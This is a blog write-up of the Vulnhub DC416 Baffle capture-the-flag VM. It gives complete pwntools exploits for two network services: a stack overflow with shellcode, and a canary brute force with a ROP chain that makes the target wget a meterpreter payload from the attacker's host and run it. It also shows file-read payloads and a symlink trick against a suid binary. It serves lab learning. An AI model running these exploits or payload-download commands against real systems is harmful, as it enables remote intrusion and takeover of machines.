+++
Description = "Vulnhub - DC416: Baffle Writeup"
title = "Vulnhub - DC416: Baffle Writeup"
date = "2017-01-02T22:00:00+01:00"
metakeys = ["vulnhub", "walkthrough", "writeup", "DC416", "baffle"]
image = "/img/misc/vulnhub.png"
+++

After I finished [DC416 - Basement](/post/vulnhub_dc416_basement/) I wanted to give the next VM a try: [DC416 - baffle](https://www.vulnhub.com/entry/dc416-2016,168/) by [@superkojiman](https://twitter.com/superkojiman).

<!--more-->

Here are my other writeups for the DC416 challenges:

- [DC416 Basement](/post/vulnhub_dc416_basement/)
- [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
- [DC416 Fortress](/post/vulnhub_dc416_fortress/)

# Information Gathering

As always I started with a `netdiscover` to get the machines IP-Address and viewed the instructions on Port 80 in a browser.

```
Engagement Rules:
    No username/password bruteforcing is necessary
    This box has 5 flags
    Flags are in FLAG{} format
    The goal is not to get root. Get the flags and move on
    Have fun
```

So let's get the party started

```
root@kali:~/baffle# nmap -sSV -T4 -A -p- 192.168.56.2

Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-02 21:08 CET
Nmap scan report for 192.168.56.2
Host is up (0.00047s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 34:b3:3e:f7:50:91:51:6f:0b:e2:35:7b:d1:34:a1:eb (DSA)
|   2048 b9:a9:a8:bc:db:7d:77:e4:ae:31:1c:16:4f:3b:8b:de (RSA)
|_  256 88:3f:60:bb:9e:49:53:e3:f7:bb:30:84:7f:a8:f0:17 (ECDSA)
80/tcp   open  http     nginx 1.6.2
| http-git:
|   192.168.56.2:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Trashed my code, but deployed the product anyway.
|_http-server-header: nginx/1.6.2
|_http-title: baffle
6969/tcp open  acmsoda?
MAC Address: 08:00:27:84:83:C3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# alice

Nmap found a `.git` directory in the webroot with directory listing enabled. This allows us to easily retreive the contents using wget

```
wget -r --no-parent http://192.168.56.2/.git/
```

Now we are able to operate with git on the directory:

```
root@kali:~/baffle# cd 192.168.56.2/
root@kali:~/baffle/192.168.56.2# git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	deleted:    hellofriend.c

no changes added to commit (use "git add" and/or "git commit -a")
```

And here is the commit history:

```
root@kali:~/baffle/192.168.56.2# git log
commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:58:02 2016 -0400

    Trashed my code, but deployed the product anyway.

commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:55:07 2016 -0400

    Some assembly required

commit 9b5c226d15d611d6957f3fda7c993186270a6cc4
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:52:40 2016 -0400

    Made it into a write-type-thing instead

commit 06483346fab91b2b17471074a887ac7dffd9ceda
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:44:25 2016 -0400

    My cat danced on the keyboard

commit 7edc47a1c3e4dc880a7191915bdbf1565c6b7441
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:37:14 2016 -0400

    This coder turned coffee into code. You won't believe how she did it!

commit d7a1f067a2f4ac469bc4cf77c689a34e2286b665
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:30:20 2016 -0400

    Hello, friend...
```

Viewing the files on every commit by `git checkout HASH` we can extract the following revisions of `hellofriend.c`:

**d7a1f067a2f4ac469bc4cf77c689a34e2286b665**

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int parse_request(char *req, int n) {
    return 0;
}



int main(int argc, char *argv[]) {
    char buf[2000];
    int n;

    setbuf(stdout, 0);

    memset(buf, 0, sizeof(buf));
    n = read(0, buf, sizeof(buf));
    parse_request(buf, n);

    return 0;
}
```

**7edc47a1c3e4dc880a7191915bdbf1565c6b7441**

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int parse_request(char *req, int n) {
    char file[500];
    char file_content[500];
    int file_len;
    char *ptr = req;
    FILE *fp;

    memset(file, 0, sizeof(file));

    ptr = (char *)ptr + 2;
    file_len = n - 2 - 5 - 2;
    memcpy(file, ptr, file_len);

    fp = fopen(file, "r");
    if (fp) {
        memset(file_content, 0, sizeof(file_content));
        fgets(file_content, sizeof(file_content), fp);
        printf("%s", file_content);
    }
    return 0;
}

int main(int argc, char *argv[]) {
    char buf[2000];
    int n;

    setbuf(stdout, 0);

    memset(buf, 0, sizeof(buf));
    n = read(0, buf, sizeof(buf));
    parse_request(buf, n);

    return 0;
}
```

**06483346fab91b2b17471074a887ac7dffd9ceda**

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int parse_request(char *req, int n) {
    char file[500];
    char file_content[500];
    int file_len;
    char *ptr = req;
    FILE *fp;

    memset(file, 0, sizeof(file));

    ptr = (char *)ptr + 2;
    FiLe_len = n - 2 - 5 - 2;
    memcpy(file, ptr, file_len);

    fp = fopen(file, "r");
    if (fp) {
        memset(file_content, 0, sizeof(file_content));
        fgets(file_content, sizeof(file_content), fp);
        printf("%s", file_content);
    }
    return 0;
}

int mAin(int arGc, char *argv[]) {
    char buf[2000];
    int n;

    setbuf(stdout, 0);

    memset(buf, 0, sizeof(buf));
    n = read(0, buf, sizeof(buf));
    p{ARSE_REQUEST}(buf, n);

    return 0;
}
```

**9b5c226d15d611d6957f3fda7c993186270a6cc4**

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char to_write[500];

int parse_request(char *req, int n) {
    char data[500];
    char file[500];
    char file_content[500];
    int file_len;
    int req_type;
    char mode[10];
    char *ptr = req;
    FILE *fp;

    memset(file, 0, sizeof(file));
    memset(mode, 0, sizeof(mode));

    memset(data, 0, sizeof(data));
    memset(to_write, 0, sizeof(to_write));

    ptr = (char *)ptr + 2;
    file_len = strlen(ptr);

    ptr = (char *)ptr + file_len + 1;
    ptr = (char *)ptr + 6;

    memcpy(to_write, ptr, 500);
    memcpy(data, ptr, 2000);

    return 0;
}

int main(int argc, char *argv[]) {
    char buf[2000];
    int n;

    setbuf(stdout, 0);

    memset(buf, 0, sizeof(buf));
    n = read(0, buf, sizeof(buf));
    parse_request(buf, n);

    return 0;
}
```

**d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca**

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char to_write[500];

int parse_request(char *req, int n) {
    char data[500];
    char file[500];
    char file_content[500];
    int file_len;
    int req_type;
    char mode[10];
    char *ptr = req;
    FILE *fp;

    memset(file, 0, sizeof(file));
    memset(mode, 0, sizeof(mode));

    memset(data, 0, sizeof(data));
    memset(to_write, 0, sizeof(to_write));

    ptr = (char *)ptr + 2;
    file_len = strlen(ptr);

    ptr = (char *)ptr + file_len + 1;
    ptr = (char *)ptr + 6;

    memcpy(to_write, ptr, 500);
    memcpy(data, ptr, 2000);

    return 0;
}

int main(int argc, char *argv[]) {
    char buf[2000];
    int n;

    setbuf(stdout, 0);

    memset(buf, 0, sizeof(buf));
    n = read(0, buf, sizeof(buf));
    parse_request(buf, n);

    return 0;
}
```

**8bde72465957415c12ab6f89ff679f8f9e7c5c7a**

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char to_write[500];

int parse_request(char *req, int n) {
    char data[500];
    char file[500];
    char file_content[500];
    int file_len;
    int req_type;
    char mode[10];
    char *ptr = req;
    FILE *fp;

    if (req_type == 0x01) {
        /* todo */
    }
    if (req_type == 0x2) {
        /* todo */
    }
    return 0;
}

int main(int argc, char *argv[]) {
    char buf[2000];
    int n;

    setbuf(stdout, 0);

    memset(buf, 0, sizeof(buf));
    n = read(0, buf, sizeof(buf));
    parse_request(buf, n);

    return 0;
}
```

By looking at the commit log using `git log -p` we can also see a file called `project.enc` which was deleted in later commits but more on this later.

If we look closely on the file at commit `My cat danced on the keyboard` (`06483346fab91b2b17471074a887ac7dffd9ceda`) we can notice some uppercase letters. If we only extract the uppercase letters we get the following text:

```
grep -ohE "[A-Z]" hellofriend.c | tr -d "\n"

FILEFLAGARSEREQUEST
```

So this looks like a flag string. Extracting it manually from the file reveals our first flag:

```
FLAG{ARSE_REQUEST}
```

The service running on port 6969 seems to be a merged version of the `hellofriend.c` revisions. The latest version of the code seems to check the `request type` of the received packet. Request code `0x01` calls the file read code and request code `0x02` the other one. Also the code always adds two to the char pointer before the filename is parsed so the request type has to be 2 bytes long.

So let's have a look at the first code: the file read part.

The file read code ignores the first two bytes(the request type) (`ptr = (char *)ptr + 2;`) and subtracts 9 from the string length to get the filename length (2 bytes request type + 6 bytes padding + NULL terminator). So all we have to do is send request code 0x01 and pad the filename with 6 random chars.

```
root@kali:~/baffle# python -c 'print("\x01\x01/etc/passwdaaaaaa")' | nc 192.168.56.2 6969
root:x:0:0:root:/root:/bin/bash
```

As the `fgets` function only reads text up to a newline or EOF (null byte) character we are only able to read the first line of a file. This behaviour is enough to get the contents of `flag.txt`:

```
root@kali:~/baffle# python -c 'print("\x01\x01flag.txtaaaaaa")' | nc 192.168.56.2 6969
FLAG{is_there_an_ivana_tinkle}
```

If we look at commit **d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca** we can see an additional file called `project.enc`. The file seems to be base64 encoded so let's decode it and have a look:

```
root@kali:~/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
root@kali:~/baffle# cat project.enc | base64 -d > exe
root@kali:~/baffle/192.168.56.2# file exe
exe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped
```

So this looks like the compiled code and we can start analyzing it. By looking at the c code (because it's easier to read) we can see our vulnerable code at the bottom:

```
memcpy(data, ptr, 2000);
```

The `ptr` variable is modified before to cut of the header and then 2000 bytes are written to `data`. This copies way more bytes into `data` as it is able to hold (`char data[500];`).

As we have the binary we can load it in `gdb` and check if there are any protections in place

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

We can also check the ASLR status with the file read vulnerability:

```
root@kali:~/baffle# python -c 'print("\x01\x01/proc/sys/kernel/randomize_va_spaceaaaaaa")' | nc 192.168.56.2 6969
2
```

So the only protection active is ASLR but the executable is compiled without PIE. At the disassembling we can see the code variable `to_write` is located at the fixed location `0x600de0`. As the memcpy executed before our vulnerability copies 500 bytes to this location we can plant our evil shellcode there and jump right to it.

![binaryninja](/img/vulnhub_dc416_baffle/binaryninja_ctftp_to_write.png)

To exploit the vulnerability we first need to be sure we reach the vulnerable `memcpy`. By looking at the `hellofriend.c` file we can identify the following conditions that must be met:

- request type 0x02 with 2 bytes
- the `file_len` variable is a `strlen` of the whole input. As the `read` function does not stop at null bytes but the `strlen` does we can simply trick it by adding a null byte.
- After the null byte we need to add another 6 bytes
- After the 6 bytes we can plant our malicous code

First we need to get the exact offset where we are able to control our return so let's create a pattern with a valid header:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 > pattern
python -c 'print("\x02\x02asdf\x00aaaaaa")' | tr -d "\n" > test.txt
cat pattern >> test.txt
```

Then run it in gdb:

```
r < test.txt
```

We can see the `ret` instruction would return to `8Ar9As0As1....` so we view the hex representation of the address `rsp` points to:

```
gdb-peda$ x/1xg 0x7fffffffdc98
0x7fffffffdc98:	0x4130734139724138
```

We can now get the exact offset with `pattern_offset.rb` which is `536`:

```
root@kali:~/baffle# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x4130734139724138
[*] Exact match at offset 536
```

Now we have all info available to craft our exploit. When running the exploit the shellcode will be placed in the `to_write` variable and the return address is overwritten with the location of the variable and the shellcode is executed.

```
root@kali:~/baffle# ./alice.py
[*] Switching to interactive mode
$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

We are now dropped into `/` but we already have the `flag.txt` from this location.

By looking at `/etc/passwd` we can see that there are 4 users present on the system

```
vulnhub:x:1000:1000:vulnhub,,,:/home/vulnhub:/bin/bash
alice:x:1001:1001:Alice,,,:/home/alice:/bin/bash
bob:x:1002:1002:Bob,,,:/home/bob:/bin/bash
charlie:x:1003:1003:,,,:/home/charlie:/bin/bash
```

Code:

```
#!/usr/bin/env python2

from pwn import *

context(bits=64,
        os="linux",
        aslr=False,
        terminal=["tmux", "splitw", "-l", "45"])

if len(sys.argv) > 1:
    local = True
else:
    local = False

HOST = "192.168.56.2"
PORT = 6969

ADDR_TO_WRITE = 0x600de0
OFFSET = 542

def encode_payload(p):
    return "".join("\\x{:02x}".format(ord(c)) for c in p)

# msfvenom -p linux/x64/exec -v shell -f py CMD="/bin/bash"
shell =  ""
shell += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
shell += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
shell += "\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61"
shell += "\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"

header  = ""
header += "\x02\x02"                   # request type
header += "A" * 5                      # junk
header += "\x00"                       # terminator
header += "B" * 6                      # junk

payload  = ""
payload += shell                        # shell
payload += "\x90" * (500-len(shell))    # shell padding
payload += "X" * (536 - len(payload))   # offset to trigger the overflow
payload += p64(ADDR_TO_WRITE)           # return address

final_payload = header + payload

try:
    with context.quiet:
        if local:
            p = process("./ctftp")
        else:
            p = remote(HOST, PORT)
    log.debug("Sending {}".format(encode_payload(final_payload)))
    p.sendline(final_payload)
    p.interactive()
except EOFError as e:
    log.error(e)
finally:
    with context.quiet:
        p.close()
```

# bob

Another binary with the suid bit set (owned by `charlie`) can be found in `/home/bob/filez/flag_vault`. The directory also contains an unreadable `flag.txt` and `auth.txt`. The `flag_vault` binary contains a buffer overflow which I tried several hours to exploit but there is an easier way:

We can copy the binary to a writeable location, create our own `auth.txt` and create a symlink to `flag.txt`. As the binary uses no absolute paths for the files we can trick it to use these two files and we are able to read the contents of the file and get the next flag.

![binaryninja](/img/vulnhub_dc416_baffle/binaryninja_flag_vault.png)

```
cd /home/alice/
echo test > auth.txt
ln -s /home/bob/filez/flag.txt /home/alice/flag.txt
ln -s /home/bob/filez/flag_vault /home/alice/flag_vault
```

```
$ ./flag_vault
______ _                _    _   _             _ _
|  ___| |            /\| |/\| | | |           | | |
| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
                __/ |
               |___/

ENTER YOUR AUTHENTICATION CODE: test
CHECKING CODE... CODE IS VALID
DATA: FLAG{tr3each3ry_anD_cUnn1ng}
```

Using the same trick we can also get the password required by the binary:

```
ln -fs /home/bob/filez/auth.txt /home/alice/flag.txt
$ ./flag_vault
______ _                _    _   _             _ _
|  ___| |            /\| |/\| | | |           | | |
| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
                __/ |
               |___/

ENTER YOUR AUTHENTICATION CODE: test
CHECKING CODE... CODE IS VALID
DATA: we_seek_after_knowledge_and_you_call_us_criminals
```

# vulnhub

This one was the hardest challenge on baffle for me.

We can use bob's flag as a password for the user `bob` and ssh into the machine.

```
sshpass -p tr3each3ry_anD_cUnn1ng ssh bob@192.168.56.2
```

The binary `/home/bob/binz/ctfingerd` is running on localhost port 7979 under the user `vulnhub`. So we pull the binary to our machine and start analyzing it.

![binaryninja](/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_query_user.png)

In the disassembling of the `query_user` function we can see a `memset` of 1000 bytes is done for the user input but the `read` call reads up to 2000 bytes resulting in an overflow of the buffer. The binary itself has NX and stack canaries enabled so we can not simply overflow the stack as the stack canary would become invalid and terminate the process.

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

The main process of the `ctfingerd` binary calls `fork` after accepting a connection to handle the data sent to it. When doing a `fork` the whole memory content is shared with the subprocess. As the Stack Canary is calculated only once at program start and stays the same as long as the main process is active we might be able to bruteforce the canary byte by byte. You can read more about this topic in [Phrack Issue 67](http://phrack.org/issues/67/13.html).

Once the forked process returns the main process prints the string `---\n`. If the canary is invalid the forked process crashes and does not return, so the `---\n` string is never printed. This way we know that if we guessed a valid stack canary or not.

Screenshot of the stack canary check and the fact that there is no return on fail:

![binaryninja](/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_canary.png)

Here is a screenshot showing the `main` function printing out `---\n` after `query_user` returns:

![binaryninja](/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_main_return.png)

We first try to append one byte after the maximum length of our buffer resulting in an overwrite of the first byte of the stack canary. If we found a correct byte the main process returns `---\n` and we can proceed with the next byte.

After we have the correct stack canary we can continue with exploitation to get code execution. The binary is dynamically compiled and only contains references to `read`, `write` and other libc functions but no `system`.

As the address on the stack right after the canary is the return address we have control over where to forked process returns.

The binary contains a `PLT (Procedure Linkage Table)` and a `GOT (Global Offsets Table)`. What they are for in detail can be read up [here](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html). As we have the `write` function available and the program prints out it's file descriptor on every connect we can craft a ROP chain to write the effective libc address of `read` obtained from `GOT` to the file descriptor (we could use any of the available `GOT` stubs). After leaking the address we can calculate the exact memory location of `system`, prepare the parameters and jump to this address.

We can copy the libc binary from the machine using our SSH access and get the offset from `read` and calculate libc's base address.

```
bob@baffle:~/binz$ ldd ctfingerd
	linux-vdso.so.1 (0x00007ffc517b9000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5cbc719000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f5cbcac4000)
bob@baffle:~/binz$ ls -al /lib/x86_64-linux-gnu/libc.so.6
  lrwxrwxrwx 1 root root 12 Sep  5 02:09 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.19.so
```

To calculate the offsets we first need to get the location of the `read` and the `system` function.

```
root@kali:~/baffle# readelf -s libc-2.19.so | grep read@
   534: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.2.5
   657: 0000000000074890    27 FUNC    GLOBAL DEFAULT   12 _IO_file_read@@GLIBC_2.2.5
   883: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.2.5
  1082: 00000000000df390  1411 FUNC    GLOBAL DEFAULT   12 fts_read@@GLIBC_2.2.5
  1175: 00000000000e8900    31 FUNC    GLOBAL DEFAULT   12 eventfd_read@@GLIBC_2.7
  1572: 000000000006a460   320 FUNC    WEAK   DEFAULT   12 fread@@GLIBC_2.2.5
  2018: 00000000000da3a0    96 FUNC    WEAK   DEFAULT   12 pread@@GLIBC_2.2.5
  2134: 000000000006a460   320 FUNC    GLOBAL DEFAULT   12 _IO_fread@@GLIBC_2.2.5
root@kali:~/baffle# readelf -s libc-2.19.so | grep system@
   577: 0000000000041490    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1337: 0000000000041490    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
```

So the `read` function is located at offset `0x00000000000dbb90` and `system` at offset `0x0000000000041490`. We now need to subtract the `read` value from the leaked libc address to get the base address of libc in memory. If we then add `0x0000000000041490` to the calculated base address we get the exact location of `system` on the target machine.

As this binary is x64 we can not simply put the arguments for the call to `system` on the stack, instead we need to pass them through registers.

On x64 parameters are passed the following way (a list of system calls on x64 can be found [here](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)):

```
function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
               ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
                call #
```

The binary itself has only a few ROP gadgets available so I used a few ones from libc as we now have the base address but I tried to mostly use gadgets from the binary itself.

We can now create a rop chain to put the desired values in the registers, call system and watch our command be executed. I decided to call another read from the socket and put my command into the `.dynamic` section of the binary in memory and then call system with this address.

To test the exploit locally we need to adjust the offsets as the libc version differs with the one from the VM. Also the networking code of the binary is really crappy as it never releases a socket resulting in `too many open files` error messages when running against the VM. In that case a simple VM reset helps :) But the case that we have to bruteforce the canary on each run and the crappy socket handling makes debugging this binary a pain in the ass - thanks [@superkojiman](https://twitter.com/superkojiman) :D

We can expose the local port on our machine by using a SSH port forward and executing the script again - this should get us a shell:

```
sshpass -p tr3each3ry_anD_cUnn1ng ssh -L 7979:localhost:7979 bob@192.168.56.2
```

Final output of the exploit:

```
root@kali:~/baffle# ./ctfingerd.py
[+] Found part 1/8 of stack canary: 0x0
[+] Found part 2/8 of stack canary: 0x19
[+] Found part 3/8 of stack canary: 0xfb
[+] Found part 4/8 of stack canary: 0x13
[+] Found part 5/8 of stack canary: 0x6b
[+] Found part 6/8 of stack canary: 0xc8
[+] Found part 7/8 of stack canary: 0x35
[+] Found part 8/8 of stack canary: 0x96
[+] Stack Canary is \x00\x19\xfb\x13\x6b\xc8\x35\x96
[*] read@got: 0x6014f8
[*] leak fd: 817
[*] Sending leak payload ...
[*] leaked read address: 0x7f4379fa1b90
[*] libc base: 0x7f4379ec6000
[*] system: 0x7f4379f07490
[*] fd: 818
[*] Paused (press any to continue)
```

```
meterpreter > sysinfo
Computer     : 192.168.56.2
OS           : Debian 8.6 (Linux 3.16.0-4-amd64)
Architecture : x64
Meterpreter  : x86/linux

meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000
```

```
python -c 'import pty; pty.spawn("/bin/sh")'
$ id
id
uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev)
$ cat flag.txt
Sorry Mario. The flag is in another castle.
$ ls -alh
ls -alh
total 40K
drwx------ 3 vulnhub vulnhub 4.0K Oct 25 16:49 .
drwxr-xr-x 6 root    root    4.0K Oct 20 03:38 ..
-rw------- 1 vulnhub vulnhub    0 Oct 20 03:28 .bash_history
-rw-r--r-- 1 vulnhub vulnhub  220 Sep 12 15:05 .bash_logout
-rw-r--r-- 1 vulnhub vulnhub 3.5K Sep 12 15:05 .bashrc
-rw-r--r-- 1 vulnhub vulnhub   45 Oct 25 16:49 flag.txt
-rw-r--r-- 1 vulnhub vulnhub  462 Jan  2 16:00 log.txt
drwxr-xr-x 2 root    root    4.0K Oct 25 16:46 .my_loot
-rw-r--r-- 1 vulnhub vulnhub  675 Sep 12 15:05 .profile
-rwx------ 1 vulnhub vulnhub  297 Oct 20 03:21 run_service.sh
-rw-r--r-- 1 vulnhub vulnhub   74 Oct 20 02:08 .selected_editor
$ cat .my_loot/flag.txt
cat .my_loot/flag.txt


        !!! CONGRATULATIONS !!!

                 .-"-.
                / 4 4 \
                \_ v _/
                //   \\
               ((     ))
         =======""===""=======
                  |||
                  '|'

      FLAG{i_tot_i_saw_a_puddy_tat}
```

Code:

```
#!/usr/bin/env python2

from pwn import *
import re
import sys

context(bits=64,
        os="linux",
        aslr=False,
        #log_level="DEBUG",
        terminal=["tmux", "splitw", "-l", "45"])

if len(sys.argv) > 1:
    local = True
else:
    local = False

if local:
    p_main = process("./ctfingerd")

def encode_payload(p):
    return "".join("\\x{:02x}".format(ord(c)) for c in p)

def send_content(content):
    t = 1 if local else 2
    with context.quiet:
        p = None
        try:
            p = remote("127.0.0.1", 7979)
            temp = p.recvuntil("User to query: ", timeout=t)
            m = re.search(r"Socket fd: ([0-9]+)", temp)
            if m:
                log.info("FD: {}".format(m.group(1)))
                fd = int(m.group(1))
            p.send(content)
            p.recvuntil("Checking...\n", timeout=t)
            content = p.recv(timeout=t)
            content = content.strip()
            return content
        finally:
            if p:
                p.close()
            if local:
                p_main.recv()
    return None

def brute_next_canary_value(stack):
    for x in xrange(0, 256):
        payload = stack + chr(x)
        retval = send_content(payload)
        if retval is None:
            log.error("something has gone wrong")
        if "---" in retval:
            return x
    log.error("Can not find next canary")
    return None


def leak_address(address):
    with context.quiet:
        p = remote("127.0.0.1", 7979)
    temp = p.recvuntil("User to query: ")
    m = re.search(r"Socket fd: ([0-9]+)", temp)
    fd = int(m.group(1))
    log.info("leak fd: {}".format(fd))

    payload  = ""
    payload += user
    payload += stack_canary
    payload += p64(dummy) # RBP

    # write:
    #   rdi: fd
    #   rsi: buf
    #   rdx: count
    # rdx is 0x25 from previous calls
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(address)
    payload += p64(dummy)
    payload += p64(pop_rdi_ret)
    payload += p64(fd)
    payload += p64(write_plt)
    payload += p64(dummy)

    log.info("Sending leak payload ...")
    p.send(payload)
    p.recvuntil("Checking...\n")
    c = p.recv()
    with context.quiet:
        p.close()
    # only take the last RDX bytes, the rest is the plan file or error message
    c = c[-37:]

    # trim to 8 bytes as we received more bytes
    leak = c[:8]
    leak = unpack(leak, "all")
    return leak


stack_len = 1000

user  = "A" * 20
user += "\x0a"
user += "A" * (stack_len - len(user))

stack_canary = ""
for a in xrange(1, 9):
    ret = brute_next_canary_value(user + stack_canary)
    log.success("Found part {}/8 of stack canary: {:#02x}".format(a, ret))
    stack_canary += chr(ret)

log.success("Stack Canary is {}".format(encode_payload(stack_canary)))

dummy = 0xdeadbeefdeadbeef
pop_rdi_ret = 0x401013 # pop rdi; ret
pop_rsi_pop_r15_ret = 0x0401011 # pop rsi ; pop r15 ; ret

with context.quiet:
    b = ELF("./ctfingerd")
read_got = b.got["read"]
write_plt = b.plt["write"]
log.info("read@got: {:#08x}".format(read_got))

leak = leak_address(read_got)

log.info("leaked read address: {:#08x}".format(leak))

if local:
    # local libc version 2.24
    offset_read = 0xdb5b0
    offset_system = 0x3f460
    # xor rax, rax ; ret
    offset_xor_rax_rax = 0x80615
    # syscall ; ret
    offset_syscall = 0xa85f5
    # pop rdx ; ret
    offset_pop_rdx = 0x1b92
else:
    # remote libc version 2.19
    offset_read = 0x0dbb90
    offset_system = 0x41490
    # xor rax, rax ; ret
    offset_xor_rax_rax = 0x81dd5
    # syscall ; ret
    offset_syscall = 0xbade5
    # pop rdx ; ret
    offset_pop_rdx = 0x1b8e


libc_base = leak - offset_read
log.info("libc base: {:#08x}".format(libc_base))

addr_system = libc_base + offset_system
log.info("system: {:#08x}".format(addr_system))

if local:
    gdb_cmd = []
    gdb_cmd.append("set follow-fork-mode child")
    #  gdb_cmd.append("b *{:#08x}".format(offset_syscall))
    #  gdb_cmd.append("b *{:#08x}".format(pop_rsi_pop_r15_ret))
    gdb_cmd.append("b *{:#08x}".format(pop_rdi_ret))
    #  gdb_cmd.append("b *{:#08x}".format(addr_system))
    gdb_cmd.append("c")
    gdb_cmd = "\n".join(gdb_cmd)
    #  gdb.attach(p_main, gdb_cmd)

with context.quiet:
    p = remote("127.0.0.1", 7979)
temp = p.recvuntil("User to query: ")
m = re.search(r"Socket fd: ([0-9]+)", temp)
fd = int(m.group(1))
log.info("fd: {}".format(fd))

free_space = 0x6012c0 # .dynamic
command = "/bin/sh -c \"/usr/bin/rm -f /tmp/meterpreter; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter\"\x00";

payload  = ""
payload += user
payload += stack_canary
payload += p64(dummy)
payload += p64(pop_rdi_ret)
payload += p64(dummy)
# read via libc
# sys_read:
#   rax: 0
#   rdi: fd
#   rsi: *buf
#   rdx: count
payload += p64(libc_base + offset_xor_rax_rax)
payload += p64(pop_rdi_ret)
payload += p64(fd)
payload += p64(pop_rsi_pop_r15_ret)
payload += p64(free_space)
payload += p64(dummy)
payload += p64(libc_base + offset_pop_rdx)

payload += p64(len(command))
payload += p64(libc_base + offset_syscall)

payload += p64(pop_rdi_ret)
payload += p64(free_space)
payload += p64(addr_system)

p.send(payload)
p.recvuntil("Checking...\n")
sleep(1)
p.send(command)
p.recv()
with context.quiet:
    p.close()

pause()

if local:
    p_main.close()
```

# charlie

Getting charlies flag was straightforward

```
$ cd /home/charlie
cd charlie
$ cat flag.txt
cat flag.txt
FLAG{i_haz_sriracha_ice_cream}
```

Finally all 5 flags after a lot of fun hours exploiting the binaries :)

All 5 flags:

```
FLAG{ARSE_REQUEST}
FLAG{is_there_an_ivana_tinkle}
FLAG{tr3each3ry_anD_cUnn1ng}
FLAG{i_tot_i_saw_a_puddy_tat}
FLAG{i_haz_sriracha_ice_cream}
```
